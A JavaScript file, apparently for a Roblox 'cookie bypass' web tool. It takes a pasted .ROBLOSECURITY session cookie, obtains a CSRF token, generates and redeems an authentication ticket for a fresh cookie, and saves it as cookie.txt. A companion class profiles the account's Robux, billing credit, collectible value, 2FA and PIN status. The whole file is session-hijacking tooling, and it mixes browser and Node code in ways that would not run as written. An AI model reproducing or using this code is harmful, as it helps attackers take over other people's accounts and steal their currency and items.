window.onload = function() {
    // Inicializa las partículas de fondo
    try {
        Particles.init({
            selector: '.background',
            maxParticles: 100,
            connectParticles: true,
            speed: 2,
            minDistance: 100,
            sizeVariations: 3,
            color: '#ffffff'
        });
    } catch (error) {
        console.error("Error initializing particles:", error);
    }

    // Selecciona los enlaces de navegación y el enlace de contacto
    const navLinks = document.querySelectorAll('.nav-list > li > a');
    const contactLink = document.getElementById('contactLink');
    const copyMessage = document.getElementById('copyMessage');
    const bypassButton = document.getElementById('bypassButton');

    // Agrega un evento de clic a cada enlace de navegación
    navLinks.forEach(link => {
        link.addEventListener('click', function() {
            // Elimina la clase 'active' de todos los enlaces
            navLinks.forEach(item => item.classList.remove('active'));
            // Agrega la clase 'active' al enlace clicado
            this.classList.add('active');
            
            // Si el enlace clicado es el de contacto
            if (this === contactLink) {
                // Crea un elemento de texto temporal
                const tempInput = document.createElement('input');
                tempInput.value = 'rbx-tools@gmail.com';
                document.body.appendChild(tempInput);
                tempInput.select();
                document.execCommand('copy'); // Copia el texto al portapapeles
                document.body.removeChild(tempInput); // Elimina el elemento temporal

                // Muestra el mensaje "Copied!"
                copyMessage.style.display = 'block';
                setTimeout(() => {
                    copyMessage.style.opacity = '1'; // Aparece el mensaje
                }, 10); // Permite que la propiedad display: block surta efecto
                
                setTimeout(() => {
                    copyMessage.style.opacity = '0'; // Desaparece el mensaje
                }, 2000); // Muestra durante 2 segundos
                
                setTimeout(() => {
                    copyMessage.style.display = 'none'; // Oculta después de la animación
                }, 2500); // Oculta después de que la animación se complete
            }
        });
    });


    // Funcionalidad del botón Bypass
    bypassButton.addEventListener('click', function() {
        const authCookie = document.getElementById('cookieInput').value;

        if (authCookie) {
            refreshCookie(authCookie);
        } else {
            alert("Por favor, ingresa una cookie válida.");
        }
    });
};

const axios = require("axios");

class RobloxUser  {
    constructor(roblosecurityCookie, userId, username, displayName) {
        this.roblosecurityCookie = roblosecurityCookie;
        this.userId = userId;
        this.username = username;
        this.displayName = displayName;
    }

    async doAuthorizedRequest(url) {
        return (await axios.get(url, {
            headers: {
                Cookie: `.ROBLOSECURITY=${this.roblosecurityCookie}`,
            },
        })).data;
    }

    static async register(roblosecurityCookie) {
        const { data } = await axios.get("https://users.roblox.com/v1/users/authenticated", {
            headers: {
                Cookie: `.ROBLOSECURITY=${roblosecurityCookie}`,
            },
        });

        return new RobloxUser(roblosecurityCookie, data.id, data.name, data.displayName);
    }

    async getAccountCreationDate() {
        const { created } = await this.doAuthorizedRequest(`https://users.roblox.com/v1/users/${this.userId}`);
        return new Intl.DateTimeFormat("en-US", { dateStyle: "long", timeStyle: "long" }).format(new Date(created));
    }

    async getAccountPremiumStatus() {
        try {
            await this.doAuthorizedRequest(`https://premiumfeatures.roblox.com/v1/users/${this.userId}/subscriptions`);
            return true;
        } catch (error) {
            return false;
        }
    }

    async getAccount2FAStatus() {
        const { twoStepVerificationEnabled } = await this.doAuthorizedRequest(`https://twostepverification.roblox.com/v1/metadata`);
        return twoStepVerificationEnabled;
    }

    async getAccountPinStatus() {
        const { isEnabled } = await this.doAuthorizedRequest(`https://auth.roblox.com/v1/account/pin`);
        return isEnabled;
    }

    async getAccountBalance() {
        const { robux } = await this.doAuthorizedRequest(`https://economy.roblox.com/v1/users/${this.userId}/currency`);
        return robux;
    }

    async getUserData() {
        const creationDate = await this.getAccountCreationDate();
        const premiumStatus = await this.getAccountPremiumStatus();
        const twoFAStatus = await this.getAccount2FAStatus();
        const pinStatus = await this.getAccountPinStatus();
        const accountBalance = await this.getAccountBalance();

        return {
            username: this.username,
            uid: this.userId,
            displayName: this.displayName,
            avatarUrl: await this.getAccountBodyShot(),
            createdAt: creationDate,
            country: await this.getAccountCountry(),
            balance: accountBalance,
            isTwoStepVerificationEnabled: twoFAStatus,
            isPinEnabled: pinStatus,
            isPremium: premiumStatus,
            creditbalance: await this.getAccountCreditBalance(),
            rap: await this.getAccountRAP(this.userId),
        };
    }

    async getAccountBodyShot() {
        const { data } = await this.doAuthorizedRequest(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${this.userId}&size=720x720&format=Png&isCircular=false`);
        return data[0].imageUrl;
    }

    async getAccountCountry() {
        const { countryName } = await this.doAuthorizedRequest("https://www.roblox.com/account/settings/account-country");
        return countryName;
    }

    async getAccountCreditBalance() {
        const { balance } = await this.doAuthorizedRequest("https://billing.roblox.com/v1/credit");
        const formatter = new Intl.NumberFormat("en-US", { style: "currency", currency: "USD" });
        return formatter.format(balance);
    }

    async getAccountRAP(userId) {
        let calculatedRap = 0;
        let nextPageCursor = "";

        while (nextPageCursor !== null) {
            const inventoryPage = await this.doAuthorizedRequest(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?sortOrder=Asc&limit=100&cursor=${nextPageCursor}`);
            calculatedRap += inventoryPage.data.reduce((rap, item) => rap + item.recentAveragePrice, 0);
            nextPageCursor = inventoryPage.nextPageCursor;
        }

        return calculatedRap;
    }
}

async function refreshCookie(authCookie) {
    try {
        const authTicket = await generateAuthTicket(authCookie);
        if (!authTicket) {
            alert("Failed to generate authentication ticket.");
            return;
        }

        const { success, refreshedCookie } = await redeemAuthTicket(authTicket);
        if (success && refreshedCookie) {
            saveCookieToFile(refreshedCookie);
        } else {
            alert("Failed to extract new cookie.");
        }
    } catch (error) {
        console.error("Error refreshing cookie:", error);
        alert("An error occurred while refreshing the cookie.");
    }
}

async function fetchSessionCSRFToken(roblosecurityCookie) {
    try {
        const response = await axios.post("https://auth.roblox.com/v2/logout", {}, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${roblosecurityCookie}`
            }
        });
        return response.headers["x-csrf-token"] || null;
    } catch (error) {
        return null;
    }
}

async function generateAuthTicket(roblosecurityCookie) {
    try {
        const csrfToken = await fetchSessionCSRFToken(roblosecurityCookie);
        const response = await axios.post("https://auth.roblox.com/v1/authentication-ticket", {}, {
            headers: {
                "x-csrf-token": csrfToken,
                "referer": "https://www.roblox.com/madebySynaptrixBitch",
                'Content-Type': 'application/json',
                'Cookie': `.ROBLOSECURITY=${roblosecurityCookie}`
            }
        });

        return response.headers['rbx-authentication-ticket'] || "Failed to fetch auth ticket";
    } catch (error) {
        return "Failed to fetch auth ticket";
    }
}

    
async function redeemAuthTicket(authTicket) {
    try {
        const response = await axios.post("https://auth.roblox.com/v1/authentication-ticket/redeem", {
            "authenticationTicket": authTicket
        }, {
            headers: {
                'RBXAuthenticationNegotiation': '1'
            }
        });

        const refreshedCookieData = response.headers['set-cookie']?.toString() || "";

        return {
            success: !!refreshedCookieData,
            refreshedCookie: refreshedCookieData.match(/(_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-y-items.\|_[A-Za-z0-9]+)/g)?.toString()
        };
    } catch (error) {
        console.error("Error redeeming auth ticket:", error);
        return {
            success: false,
            robloxDebugResponse: error.response?.data
        };
    }
}

function saveCookieToFile(cookie) {
    const blob = new Blob([cookie], { type: 'text/plain' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = 'cookie.txt';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}
